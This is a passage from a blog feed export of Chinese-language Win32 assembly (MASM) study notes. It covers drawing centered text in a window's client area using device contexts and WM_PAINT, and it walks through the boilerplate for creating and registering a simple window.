<h2 id="测试图"><a href="#测试图" class="headerlink" title="测试图"></a>测试图</h2><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1fo9dl4zzhsj20u00hk0sw.jpg" alt="绘制有颜色的文本"></p>
]]></content>
      <categories>
        <category>汇编(ASM)</category>
      </categories>
      <tags>
        <tag>ASM</tag>
        <tag>读书笔记</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>Win32汇编学习(4)：绘制文本</title>
    <url>/2018/02/07/Win32-ASM-4-draw-text.html</url>
    <content><![CDATA[<p>这次，我们将学习如何在窗口的客户区“绘制”字符串。我们还将学习关于“设备环境”的概念。<br><a id="more"></a></p>
<h2 id="理论："><a href="#理论：" class="headerlink" title="理论："></a>理论：</h2><h3 id="“绘制”字符串"><a href="#“绘制”字符串" class="headerlink" title="“绘制”字符串"></a>“绘制”字符串</h3><p>Windows 中的文本是一个GUI（图形用户界面）对象。每一个字符实际上是由许多的像素点组成，这些点在有笔画的地方显示出来，这样就会出现字符。这也是为什么我说“绘制”字符，而不是写字符。通常您都是在您应用程序的客户区“绘制”字符串（尽管您也可以在客户区外“绘制”）。Windows 下的“绘制”字符串方法和 Dos 下的截然不同，在 Dos 下，您可以把屏幕想象成 85 x 25 的一个平面，而 Windows 下由于屏幕上同时有几个应用程序的画面，所以您必须严格遵从规范。Windows 通过把每一个应用程序限制在他的客户区来做到这一点。当然客户区的大小是可变的，您随时可以调整。</p>
<p>在您在客户区“绘制”字符串前，您必须从 Windows 那里得到您客户区的大小，确实您无法像在 DOS 下那样随心所欲地在屏幕上任何地方“绘制”，绘制前您必须得到 Windows 的允许，然后 Windows 会告诉您客户区的大小，字体，颜色和其它 GUI 对象的属性。您可以用这些来在客户区“绘制”。</p>
<h3 id="设备环境"><a href="#设备环境" class="headerlink" title="设备环境"></a>设备环境</h3><p>什么是“设备环境”（DC）呢？ 它其实是由 Windows 内部维护的一个数据结构。一个“设备环境”和一个特定的设备相连。像打印机和显示器。对于显示器来说，“设备环境”和一个个特定的窗口相连。</p>
<p>“设备环境”中的有些属性和绘图有关，像：颜色，字体等。您可以随时改动那些缺省值，之所以保存缺省值是为了方便。您可以把“设备环境”想象成是Windows 为您准备的一个绘图环境，而您可以随时根据需要改变某些缺省属性。</p>
<p>当应用程序需要绘制时，您必须得到一个“设备环境”的句柄。通常有几种方法。</p>
<ul>
<li>在 <code>WM_PAINT</code> 消息中使用 <code>call BeginPaint</code></li>
<li>在其他消息中使用 <code>call GetDC</code></li>
<li><code>call CreateDC</code> 建立你自己的 DC</li>
</ul>
<p>您必须牢记的是，<strong>在处理单个消息后你必须释放“设备环境”句柄</strong>。不要在一个消息处理中获得 “设备环境”句柄，而在另一个消息处理中在释放它。</p>
<p>我们在Windows 发送 <code>WM_PAINT</code> 消息时处理绘制客户区，Windows 不会保存客户区的内容，它用的是方法是“重绘”机制（譬如当客户区刚被另一个应用程序的客户区覆盖），Windows 会把 <code>WM_PAINT</code> 消息放入该应用程序的消息队列。重绘窗口的客户区是各个窗口自己的责任，您要做的是在窗口过程处理 WM_PAINT 的部分知道绘制什么和何如绘制。 </p>
<p>您必须了解的另一个概念是“无效区域”。Windows 把一个最小的需要重绘的正方形区域叫做“无效区域”。当 Windows 发现了一个”无效区域“后，它就会向该应用程序发送一个 <code>WM_PAINT</code> 消息，在 <code>WM_PAINT</code> 的处理过程中，窗口首先得到一个有关绘图的结构体，里面包括无效区的坐标位置等。您可以通过调用 <code>BeginPaint</code> 让“无效区”有效，<strong>如果您不处理 <code>WM_PAINT</code> 消息，至少要调用缺省的窗口处理函数 <code>DefWindowProc</code> ，或者调用 <code>ValidateRect</code> 让“无效区”有效。否则您的应用程序将会收到无穷无尽的 <code>WM_PAINT</code> 消息。</strong></p>
<p>下面是响应该消息的步骤： </p>
<ol>
<li>取得“设备环境”句柄 </li>
<li>绘制客户区 </li>
<li>释放“设备环境”句柄 </li>
</ol>
<p>注意，您无须显式地让“无效区”有效，这个动作由 <code>BeginPaint</code> 自动完成。您可以在 <code>BeginPaint</code> 和 <code>Endpaint</code> 之间，调用所有的绘制函数。几乎所有的 GDI 函数都需要“设备环境”的句柄作为参数。</p>
<h2 id="内容："><a href="#内容：" class="headerlink" title="内容："></a>内容：</h2><p>我们将写一个应用程序，它会在客户区的中心显示一行 “Win32 汇编非常有意思”</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.386 </span><br><span class="line">.model flat,stdcall </span><br><span class="line">option casemap:none </span><br><span class="line"></span><br><span class="line">WinMain proto :DWORD,:DWORD,:DWORD,:DWORD </span><br><span class="line"></span><br><span class="line">include \masm32\include\windows.inc </span><br><span class="line">include \masm32\include\user32.inc </span><br><span class="line">includelib \masm32\lib\user32.lib </span><br><span class="line">include \masm32\include\kernel32.inc </span><br><span class="line">includelib \masm32\lib\kernel32.lib </span><br><span class="line"></span><br><span class="line">.DATA </span><br><span class="line">ClassName db &quot;SimpleWinClass&quot;,0 </span><br><span class="line">AppName  db &quot;Our Second Window&quot;,0 </span><br><span class="line">OurText  db &quot;Win32 汇编非常有意思&quot;,0 </span><br><span class="line"></span><br><span class="line">.DATA? </span><br><span class="line">hInstance HINSTANCE ? </span><br><span class="line">CommandLine LPSTR ? </span><br><span class="line"></span><br><span class="line">.CODE </span><br><span class="line">start: </span><br><span class="line">    invoke GetModuleHandle, NULL </span><br><span class="line">    mov    hInstance,eax </span><br><span class="line">    invoke GetCommandLine</span><br><span class="line">    mov CommandLine,eax</span><br><span class="line">    invoke WinMain, hInstance,NULL,CommandLine, SW_SHOWDEFAULT </span><br><span class="line">    invoke ExitProcess,eax </span><br><span class="line"></span><br><span class="line">WinMain proc hInst:HINSTANCE, hPrevInst:HINSTANCE, CmdLine:LPSTR, CmdShow:DWORD </span><br><span class="line">    LOCAL wc:WNDCLASSEX </span><br><span class="line">    LOCAL msg:MSG </span><br><span class="line">    LOCAL hwnd:HWND </span><br><span class="line">    mov   wc.cbSize,SIZEOF WNDCLASSEX </span><br><span class="line">    mov   wc.style, CS_HREDRAW or CS_VREDRAW </span><br><span class="line">    mov   wc.lpfnWndProc, OFFSET WndProc </span><br><span class="line">    mov   wc.cbClsExtra,NULL </span><br><span class="line">    mov   wc.cbWndExtra,NULL </span><br><span class="line">    push  hInst </span><br><span class="line">    pop   wc.hInstance </span><br><span class="line">    mov   wc.hbrBackground,COLOR_WINDOW+1 </span><br><span class="line">    mov   wc.lpszMenuName,NULL </span><br><span class="line">    mov   wc.lpszClassName,OFFSET ClassName </span><br><span class="line">    invoke LoadIcon,NULL,IDI_APPLICATION </span><br><span class="line">    mov   wc.hIcon,eax </span><br><span class="line">    mov   wc.hIconSm,eax </span><br><span class="line">    invoke LoadCursor,NULL,IDC_ARROW </span><br><span class="line">    mov   wc.hCursor,eax </span><br><span class="line">    invoke RegisterClassEx, addr wc </span><br><span class="line">    invoke CreateWindowEx,NULL,ADDR ClassName,ADDR AppName,\ </span><br><span class="line">           WS_OVERLAPPEDWINDOW,CW_USEDEFAULT,\ </span><br><span class="line">           CW_USEDEFAULT,CW_USEDEFAULT,CW_USEDEFAULT,NULL,NULL,\ </span><br><span class="line">           hInst,NULL </span><br><span class="line">    mov   hwnd,eax </span><br><span class="line">    invoke ShowWindow, hwnd,SW_SHOWNORMAL </span><br><span class="line">    invoke UpdateWindow, hwnd </span><br><span class="line">        .WHILE TRUE </span><br><span class="line">                invoke GetMessage, ADDR msg,NULL,0,0 </span><br><span class="line">                .BREAK .IF (!eax) </span><br><span class="line">                invoke TranslateMessage, ADDR msg </span><br><span class="line">                invoke DispatchMessage, ADDR msg </span><br><span class="line">        .ENDW </span><br><span class="line">        mov     eax,msg.wParam </span><br><span class="line">        ret </span><br><span class="line">WinMain endp </span><br><span class="line"></span><br><span class="line">WndProc proc hWnd:HWND, uMsg:UINT, wParam:WPARAM, lParam:LPARAM </span><br><span class="line">    LOCAL hdc:HDC </span><br><span class="line">    LOCAL ps:PAINTSTRUCT </span><br><span class="line">    LOCAL rect:RECT </span><br><span class="line">    .IF uMsg==WM_DESTROY </span><br><span class="line">        invoke PostQuitMessage,NULL </span><br><span class="line">    .ELSEIF uMsg==WM_PAINT </span><br><span class="line">        invoke BeginPaint,hWnd, ADDR ps </span><br><span class="line">        mov    hdc,eax </span><br><span class="line">        invoke GetClientRect,hWnd, ADDR rect </span><br><span class="line">        invoke DrawText, hdc,ADDR OurText,-1, ADDR rect, \ </span><br><span class="line">                DT_SINGLELINE or DT_CENTER or DT_VCENTER </span><br><span class="line">        invoke EndPaint,hWnd, ADDR ps </span><br><span class="line">    .ELSE </span><br><span class="line">        invoke DefWindowProc,hWnd,uMsg,wParam,lParam </span><br><span class="line">        ret </span><br><span class="line">    .ENDIF </span><br><span class="line">    xor   eax, eax </span><br><span class="line">    ret </span><br><span class="line">WndProc endp </span><br><span class="line">end start</span><br></pre></td></tr></table></figure>
<h2 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h2><p>这里的大多数代码和<code>Win32汇编学习(3)：简单的窗口</code>中的一样。我只解释其中一些不相同的地方。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LOCAL hdc：HDC</span><br><span class="line">LOCAL ps：PAINTSTRUCT</span><br><span class="line">LOCAL rect：RECT</span><br></pre></td></tr></table></figure>
<p>这些局部变量由处理 <code>WM_PAINT</code> 消息中的 GDI 函数调用。<code>hdc</code> 用来存放调用 <code>BeginPaint</code> 返回的“设备环境”句柄。<code>ps</code> 是一个 <code>PAINTSTRUCT</code> 数据类型的变量。通常您不会用到其中的许多值，它由 Windows 传递给 <code>BeginPaint</code>，在结束绘制后再原封不动的传递给 <code>EndPaint</code>。<code>rect</code> 是一个 <code>RECT</code> 结构体类型参数，它的定义如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">RECT Struct left LONG ?</span><br><span class="line">top LONG ?</span><br><span class="line">right LONG ?</span><br><span class="line">bottom LONG ?</span><br><span class="line">RECT ends</span><br></pre></td></tr></table></figure>
<p>left 和 top 是正方形左上角的坐标。right 和 bottom 是正方形右下角的坐标。客户区的左上角的坐标是 x=0，y=0，这样对于 x=0，y=10 的坐标点就在它的下面。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">invoke BeginPaint，hWnd， ADDR ps</span><br><span class="line">mov hdc，eax</span><br><span class="line">invoke GetClientRect，hWnd， ADDR rect</span><br><span class="line">invoke DrawText， hdc，ADDR OurText，-1， ADDR rect， \ </span><br><span class="line">DT_SINGLELINE or DT_CENTER or DT_VCENTER</span><br><span class="line">invoke EndPaint，hWnd， ADDR ps</span><br></pre></td></tr></table></figure>
<p>在处理 <code>WM_PAINT</code> 消息时，您调用<code>BeginPaint</code>函数，传给它一个窗口句柄和未初始化的 <code>PAINTSTRUCT</code> 型参数。调用成功后在 eax 中返回“设备环境”的句柄。下一次，调用 <code>GetClientRect</code> 以得到客户区的大小，大小放在 <code>rect</code> 中，然后把它传给 <code>DrawText</code>。<code>DrawText</code> 的语法如下： </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DrawText proto hdc：HDC， lpString：DWORD， nCount：DWORD， lpRect：DWORD， uFormat：DWORD</span><br></pre></td></tr></table></figure>
<p><code>DrawText</code>是一个高层的调用函数。它能自动处理像换行、把文本放到客户区中间等这些杂事。所以您只管集中精力“绘制”字符串就可以了。让我们来看一看该函数的参数： </p>
<ul>
<li><code>hdc</code>： “设备环境”的句柄。 </li>
<li><code>lpString</code>：要显示的文本串，该文本串要么以NULL结尾，要么在nCount中指出它的长短。 </li>
<li><code>nCount</code>：要输出的文本的长度。若以NULL结尾，该参数必须是-1。 </li>
<li><code>lpRect</code>： 指向要输出文本串的正方形区域的指针，该方形必须是一个裁剪区，也就是说超过该区域的字符将不能显示。 </li>
<li><code>uFormat</code>：指定如何显示。我们可以用 or 把以下标志或到一块： <ul>
<li>DT_SINGLELINE：是否单行显示。 </li>
<li>DT_CENTER：是否水平居中。 </li>
<li>DT_VCENTER ：是否垂直居中。 </li>
</ul>
</li>
</ul>
<p>结束绘制后，必须调用 <code>EndPaint</code> 释放“设备环境”的句柄。 好了，现在我们把“绘制”文本串的要点总结如下：</p>
<ol>
<li>必须在开始和结束处分别调用 <code>BeginPaint</code> 和 <code>EndPaint</code>； </li>
<li>在 <code>BeginPaint</code> 和 <code>EndPaint</code> 之间调用所有的绘制函数； </li>
<li>如果在其它的消息处理中重新绘制客户区，您可以有两种选择：<ul>
<li>用<code>GetDC</code>和<code>ReleaseDC</code>代替<code>BeginPaint</code>和<code>EndPaint</code>；</li>
<li>调用<code>InvalidateRect</code>或<code>UpdateWindow</code>让客户区无效，这将迫使WINDOWS把<code>WM_PAINT</code>放入应用程序消息队列，从而使得客户区重绘。</li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>汇编(ASM)</category>
      </categories>
      <tags>
        <tag>ASM</tag>
        <tag>读书笔记</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>Win32汇编学习(3)：简单的窗口</title>
    <url>/2018/02/06/Win32%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0-3-%EF%BC%9A%E7%AE%80%E5%8D%95%E7%9A%84%E7%AA%97%E5%8F%A3.html</url>
    <content><![CDATA[<p>这次我们将写一个 Windows 程序，它会在桌面显示一个标准的窗口，以此根据代码来学习如何创建一个简单的窗口。<br><a id="more"></a></p>
<h2 id="理论："><a href="#理论：" class="headerlink" title="理论："></a>理论：</h2><p>Windows 程序中，在写图形用户界面时需要调用大量的标准 Windows Gui 函数。其实这对用户和程序员来说都有好处，对于用户，面对的是同一套标准的窗口，对这些窗口的操作都是一样的，所以使用不同的应用程序时无须重新学习操作。对程序员来说，这些 Gui 源代码都是经过了微软的严格测试，随时拿来就可以用的。当然至于具体地写程序对于程序员来说还是有难度的。为了创建基于窗口的应用程序，必须严格遵守规范。做到这一点并不难，只要用模块化或面向对象的编程方法即可。</p>
<p>下面我就列出在桌面显示一个窗口的几个步骤：</p>
<ol>
<li>得到您应用程序的句柄(必需)； </li>
<li>得到命令行参数(如果您想从命令行得到参数，可选)； </li>
<li>注册窗口类(必需，除非您使用 Windows 预定义的窗口类，如 MessageBox 或 dialog box； </li>
<li>产生窗口(必需)； </li>
<li>在桌面显示窗口(必需，除非您不想立即显示它)； </li>
<li>刷新窗口客户区； </li>
<li>进入无限的获取窗口消息的循环； </li>
<li>如果有消息到达，由负责该窗口的窗口回调函数处理； </li>
<li>如果用户关闭窗口，进行退出处理。 </li>
</ol>
<p>相对于单用户的 DOS 下的编程来说，Windows 下的程序框架结构是相当复杂的。但是 Windows 和 DOS 在系统架构上是截然不同的。Windows 是一个多任务的操作系统，故系统中同时有多个应用程序彼此协同运行。这就要求 Windows 程序员必须严格遵守编程规范，并养成良好的编程风格。</p>
<h2 id="内容："><a href="#内容：" class="headerlink" title="内容："></a>内容：</h2><p>下面是我们简单的窗口程序的源代码。在进入复杂的代码前，指出几点要点：</p>
<ul>
<li>您应当把程序中要用到的所有常量和结构体的声明放到一个头文件中，并且在源程序的开始处包含这个头文件。这么做将会节省您大量的时间，也免得一次又一次的敲键盘。目前，我所使用的是<a href="http://masm32.com/" target="_blank" rel="noopener">masm32.com</a>提供的。您也可以定义您自己的常量和结构体，但最好把它们放到独立的头文件中 </li>
<li>用 includelib 指令，包含您的程序要引用的库文件，譬如：若您的程序要调用 “MessageBox”， 您就应当在源文件中加入如下一行： includelib user32.lib 这条语句告诉 MASM 您的程序将要用到一些引入库。如果您不止引用一个库，只要简单地加入 includelib 语句，不要担心链接器如何处理这么多的库，只要在链接时用链接开关 /LIBPATH 指明库所在的路径即可。 </li>
<li>在其它地方运用头文件中定义函数原型，常数和结构体时，要严格保持和头文件中的定义一致，包括大小写。在查询函数定义时，这将节约您大量的时间； </li>
<li>在编译，链接时用makefile文件，免去重复敲键。 </li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.386 </span><br><span class="line">.model flat,stdcall </span><br><span class="line">option casemap:none </span><br><span class="line">include windows.inc </span><br><span class="line">include user32.inc </span><br><span class="line">includelib user32.lib            ; calls to functions in user32.lib and kernel32.lib </span><br><span class="line">include kernel32.inc </span><br><span class="line">includelib kernel32.lib </span><br><span class="line"></span><br><span class="line">WinMain proto :DWORD,:DWORD,:DWORD,:DWORD </span><br><span class="line"></span><br><span class="line">.DATA                     ; initialized data </span><br><span class="line">ClassName db &quot;SimpleWinClass&quot;,0        ; the name of our window class </span><br><span class="line">AppName db &quot;Our First Window&quot;,0        ; the name of our window </span><br><span class="line"></span><br><span class="line">.DATA?                ; Uninitialized data </span><br><span class="line">hInstance HINSTANCE ?        ; Instance handle of our program </span><br><span class="line">CommandLine LPSTR ? </span><br><span class="line">.CODE                ; Here begins our code </span><br><span class="line">start: </span><br><span class="line">invoke GetModuleHandle, NULL            ; get the instance handle of our program. </span><br><span class="line">                                                                       ; Under Win32, hmodule==hinstance mov hInstance,eax </span><br><span class="line">mov hInstance,eax </span><br><span class="line">invoke GetCommandLine                        ; get the command line. You don&apos;t have to call this function IF </span><br><span class="line">                                                                       ; your program doesn&apos;t process the command line. </span><br><span class="line">mov CommandLine,eax </span><br><span class="line">invoke WinMain, hInstance,NULL,CommandLine, SW_SHOWDEFAULT        ; call the main function </span><br><span class="line">invoke ExitProcess, eax                           ; quit our program. The exit code is returned in eax from WinMain. </span><br><span class="line"></span><br><span class="line">WinMain proc hInst:HINSTANCE,hPrevInst:HINSTANCE,CmdLine:LPSTR,CmdShow:DWORD </span><br><span class="line">    LOCAL wc:WNDCLASSEX                                            ; create local variables on stack </span><br><span class="line">    LOCAL msg:MSG </span><br><span class="line">    LOCAL hwnd:HWND </span><br><span class="line"></span><br><span class="line">    mov   wc.cbSize,SIZEOF WNDCLASSEX                   ; fill values in members of wc </span><br><span class="line">    mov   wc.style, CS_HREDRAW or CS_VREDRAW </span><br><span class="line">    mov   wc.lpfnWndProc, OFFSET WndProc </span><br><span class="line">    mov   wc.cbClsExtra,NULL </span><br><span class="line">    mov   wc.cbWndExtra,NULL </span><br><span class="line">    push  hInstance </span><br><span class="line">    pop   wc.hInstance </span><br><span class="line">    mov   wc.hbrBackground,COLOR_WINDOW+1 </span><br><span class="line">    mov   wc.lpszMenuName,NULL </span><br><span class="line">    mov   wc.lpszClassName,OFFSET ClassName </span><br><span class="line">    invoke LoadIcon,NULL,IDI_APPLICATION </span><br><span class="line">    mov   wc.hIcon,eax </span><br><span class="line">    mov   wc.hIconSm,eax </span><br><span class="line">    invoke LoadCursor,NULL,IDC_ARROW </span><br><span class="line">    mov   wc.hCursor,eax </span><br><span class="line">    invoke RegisterClassEx, addr wc                       ; register our window class </span><br><span class="line">    invoke CreateWindowEx,NULL,\ </span><br><span class="line">                ADDR ClassName,\ </span><br><span class="line">                ADDR AppName,\ </span><br><span class="line">                WS_OVERLAPPEDWINDOW,\ </span><br><span class="line">                CW_USEDEFAULT,\ </span><br><span class="line">                CW_USEDEFAULT,\ </span><br><span class="line">                CW_USEDEFAULT,\ </span><br><span class="line">                CW_USEDEFAULT,\ </span><br><span class="line">                NULL,\ </span><br><span class="line">                NULL,\ </span><br><span class="line">                hInst,\ </span><br><span class="line">                NULL </span><br><span class="line">    mov   hwnd,eax </span><br><span class="line">    invoke ShowWindow, hwnd,CmdShow               ; display our window on desktop </span><br><span class="line">    invoke UpdateWindow, hwnd                                 ; refresh the client area </span><br><span class="line"></span><br><span class="line">    .WHILE TRUE                                                         ; Enter message loop </span><br><span class="line">                invoke GetMessage, ADDR msg,NULL,0,0 </span><br><span class="line">                .BREAK .IF (!eax) </span><br><span class="line">                invoke TranslateMessage, ADDR msg </span><br><span class="line">                invoke DispatchMessage, ADDR msg </span><br><span class="line">   .ENDW </span><br><span class="line">    mov     eax,msg.wParam                                            ; return exit code in eax </span><br><span class="line">    ret </span><br><span class="line">WinMain endp </span><br><span class="line"></span><br><span class="line">WndProc proc hWnd:HWND, uMsg:UINT, wParam:WPARAM, lParam:LPARAM </span><br><span class="line">    .IF uMsg==WM_DESTROY                           ; if the user closes our window </span><br><span class="line">        invoke PostQuitMessage,NULL             ; quit our application </span><br><span class="line">    .ELSE </span><br><span class="line">        invoke DefWindowProc,hWnd,uMsg,wParam,lParam     ; Default message processing </span><br><span class="line">        ret </span><br><span class="line">    .ENDIF </span><br><span class="line">    xor eax,eax </span><br><span class="line">    ret </span><br><span class="line">WndProc endp </span><br><span class="line"></span><br><span class="line">end start</span><br></pre></td></tr></table></figure>
<h2 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h2><p>看到一个简单的 Windows 程序有这么多行，您是不是有点想死? 但是您必须要知道的是上面的大多数代码都是模板而已，模板的意思即是指这些代码对差不多所有标准 Windows 程序来说都是相同的。在写 Windows 程序时您可以把这些代码拷来拷去，当然把这些重复的代码写到一个库中也挺好。其实真正要写的代码集中在 WinMain 中。这和一些 C 编译器一样，无须要关心其它杂务，集中精力于 WinMain 函数。<strong>唯一不同的是 C 编译器要求您的源代码有必须有一个函数叫 WinMain。否则 C 无法知道将哪个函数和有关的前后代码链接。相对C，汇编语言提供了较大的灵活性，它不强行要求一个叫 WinMain 的函数。</strong></p>
<p>做好心理准备，下面我们开始分析代码。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.386</span><br><span class="line">.model flat，stdcall</span><br><span class="line">option casemap：none</span><br><span class="line"></span><br><span class="line">WinMain proto ：DWORD，：DWORD，：DWORD，：DWORD</span><br><span class="line"></span><br><span class="line">include windows.inc</span><br><span class="line">include user32.inc</span><br><span class="line">include kernel32.inc</span><br><span class="line">includelib user32.lib</span><br><span class="line">includelib kernel32.lib</span><br></pre></td></tr></table></figure>
<p>您可以把前三行看成是”必须”的.</p>
<p><code>.386</code>告诉MASN我们要用80386指令集。<br><code>. model flat，stdcall</code>告诉MASM 我们用的内存寻址模式，此处也可以加入stdcall告诉MASM我们所用的参数传递约定。  </p>
<p>接下来是函数 WinMain 的原型声明，因为我们稍后要用到该函数，故必须先声明。我们必须包含 window.inc 文件，因为其中包含大量要用到的常量和结构的定义，该文件是一个文本文件，您可以用任何文本编辑器打开并且查看它</p>
<p>我们的程序调用 user32.dll (譬如：CreateWindowEx， RegisterWindowClassEx) 和 kernel32.dll (ExitProcess)中的函数，所以必须链接这两个库。接下来我如果问：您需要把什么库链入您的程序呢 ? 答案是：先查到您要调用的函数在什么库中，然后包含进来。譬如：若您要调用的函数在 gdi32.dll 中，您就要包含gdi32.inc头文件。和 MASM 相比，TASM 则要简单得多，您只要引入一个库，即：import32.lib。&lt;但 Tasm5 麻烦的是 windows.inc 非常的不全面，而且如果在 Windows.inc 中包含全部的 API 定义会内存不够，所以每次你得把用到的 API 定义拷贝出来&gt;</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.DATA</span><br><span class="line"></span><br><span class="line">ClassName db &quot;SimpleWinClass&quot;，0 </span><br><span class="line">AppName db &quot;Our First Window&quot;，0</span><br><span class="line"></span><br><span class="line">.DATA?</span><br><span class="line"></span><br><span class="line">hInstance HINSTANCE ?</span><br><span class="line">CommandLine LPSTR ?</span><br></pre></td></tr></table></figure>
<p>接下来是<code>DATA</code>“分段”。 在 .DATA 中我们定义了两个以 NULL 结尾的字符串 (ASCIIZ)：其中 ClassName 是 Windows 类名，AppName 是我们窗口的名字。这两个变量都是初始化了的。未进行初始化的两个变量放在 <code>.DATA?</code> “分段”中，其中 hInstance 代表应用程序的句柄，CommandLine 保存从命令行传入的参数。HINSTACE 和 LPSTR 是两个数据类型名，它们在头文件中定义，可以看做是 DWORD 的别名，之所以要这么重新定仅是为了易记。您可以查看 windows.inc 文件，在 .DATA? 中的变量都是未经初始化的，这也就是说在程序刚启动时它们的值是什么无关紧要，只不过占有了一块内存，以后可以再利用而已。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.CODE</span><br><span class="line">start：</span><br><span class="line">invoke GetModuleHandle， NULL</span><br><span class="line">mov hInstance，eax</span><br><span class="line">invoke GetCommandLine</span><br><span class="line">mov CommandLine，eax</span><br><span class="line">invoke WinMain， hInstance，NULL，CommandLine， SW_SHOWDEFAULT</span><br><span class="line">invoke ExitProcess，eax</span><br><span class="line">.....</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>
<p><code>.CODE</code> “分段”包含了您应用程序的所有代码，这些代码必须都在 .code 和 end 之间。至于 label 的命名只要遵从 Windows 规范而且保证唯一则具体叫什么倒是无所谓。我们程序的第一条语句是调用 GetModuleHandle 去查找我们应用程序的句柄。在Win32下，应用程序的句柄和模块的句柄是一样的。您可以把实例句柄看成是您的应用程序的 ID 号。我们在调用几个函数是都把它作为参数来进行传递，所以在一开始便得到并保存它就可以省许多的事。</p>
<p>特别注意：WIN32下的实例句柄实际上是您应用程序在内存中的线性地址。</p>
<p><strong>WIN32 中函数的函数如果有返回值，那它是通过 eax 寄存器来传递的。其他的值可以通过传递进来的参数地址进行返回。</strong>一个 WIN32 函数被调用时总会保存好段寄存器和 ebx，edi，esi和ebp 寄存器，而 ecx和edx 中的值总是不定的，不能在返回时应用。特别注意：从 Windows API 函数中返回后，eax，ecx，edx 中的值和调用前不一定相同。当函数返回时，返回值放在eax中。如果您应用程序中的函数提供给 Windows 调用时，也必须遵守这一点，即在函数入口处保存段寄存器和 ebx，esp，esi，edi 的值并在函数返回时恢复。如果不这样一来的话，您的应用程序很快会崩溃。从您的程序中提供给 Windows 调用的函数大体上有两种：Windows 窗口过程和 Callback 函数。</p>
<p>如果您的应用程序不处理命令行那么就无须调用 GetCommandLine，这里只是告诉您如果要调用应该怎么做。 </p>
<p>下面则是调用WinMain了。该函数共有4个参数：应用程序的实例句柄，该应用程序的前一实例句柄，命令行参数串指针和窗口如何显示。Win32 没有前一实例句柄的概念，所以第二个参数总为0。之所以保留它是为了和 Win16 兼容的考虑，在 Win16下，如果 hPrevInst 是 NULL，则该函数是第一次运行。特别注意：您不用必须声明一个名为 WinMain 函数，事实上在这方面您可以完全作主，您甚至无须有一个和 WinMain 等同的函数。您只要把 WinMain 中的代码拷到GetCommandLine 之后，其所实现的功能完全相同。在 WinMain 返回时，把返回码放到 eax 中。然后在应用程序结束时通过 ExitProcess 函数把该返回码传递给 Windows 。 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">WinMain proc Inst:HINSTANCE,hPrevInst:HINSTANCE,CmdLine:LPSTR,CmdShow:DWORD</span><br></pre></td></tr></table></figure>
<p>上面是WinMain的定义。注意跟在 proc 指令后的parameter：type形式的参数，它们是由调用者传给 WinMain 的，我们引用是直接用参数名即可。至于压栈和退栈时的平衡堆栈工作由 MASM 在编译时加入相关的前序和后序汇编指令来进行。 <code>LOCAL wc：WNDCLASSEX LOCAL msg：MSG LOCAL hwnd：HWND LOCAL</code> 伪指令为局部变量在栈中分配内存空间，所有的 LOCAL 指令必须紧跟在 PROC 之后。LOCAL 后跟声明的变量，其形式是 变量名:变量类型。譬如 <code>LOCAL wc：WNDCLASSEX</code> 即是告诉 MASM 为名字叫 wc 的局部边量在栈中分配长度为 WNDCLASSEX 结构体长度的内存空间，然后我们在用该局部变量是无须考虑堆栈的问题，考虑到 DOS 下的汇编，这不能不说是一种恩赐。不过这就要求这样声明的局部变量在函数结束时释放栈空间，(也即不能在函数体外被引用)，另一个缺点是您因不能初始化您的局部变量，不得不在稍后另外再对其赋值。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov wc.cbSize，SIZEOF WNDCLASSEX</span><br><span class="line">mov wc.style， CS_HREDRAW or CS_VREDRAW</span><br><span class="line">mov wc.lpfnWndProc， OFFSET WndProc</span><br><span class="line">mov wc.cbClsExtra，NULL</span><br><span class="line">mov wc.cbWndExtra，NULL</span><br><span class="line">push hInstance</span><br><span class="line">pop wc.hInstance</span><br><span class="line">mov wc.hbrBackground，COLOR_WINDOW+1 </span><br><span class="line">mov wc.lpszMenuName，NULL</span><br><span class="line">mov wc.lpszClassName，OFFSET ClassName </span><br><span class="line">invoke LoadIcon，NULL，IDI_APPLICATION</span><br><span class="line">mov wc.hIcon，eax</span><br><span class="line">mov wc.hIconSm，eax</span><br><span class="line">invoke LoadCursor，NULL，IDC_ARROW</span><br><span class="line">mov wc.hCursor，eax invoke </span><br><span class="line">RegisterClassEx， addr w</span><br></pre></td></tr></table></figure>
<p>上面几行从概念上说确实是非常地简单。只要几行指令就可以实现。其中的主要概念就是窗口类（window class），一个窗口类就是一个有关窗口的规范，这个规范定义了几个主要的窗口的元素，如：图标、光标、背景色、和负责处理该窗口的函数。您产生一个窗口时就必须要有这样的一个窗口类。如果您要产生不止一个同种类型的窗口时，最好的方法就是把这个窗口类存储起来，这种方法可以节约许多的内存空间。也许今天您不会太感觉到，可是想想以前 PC 大多数只有 1M 内存时，这么做是非常有必要的。如果您要定义自己的创建窗口类就必须：在一个 WINDCLASS 或 WINDOWCLASSEXE 结构体中指明您窗口的组成元素，然后调用 RegisterClass 或 RegisterClassEx ，再根据该窗口类产生窗口。对不同特色的窗口必须定义不同的窗口类。 WINDOWS有几个预定义的窗口类，譬如：按钮、编辑框等。要产生该种风格的窗口无须预先再定义窗口类了，只要包预定义类的类名作为参数调用 CreateWindowEx 即可。</p>
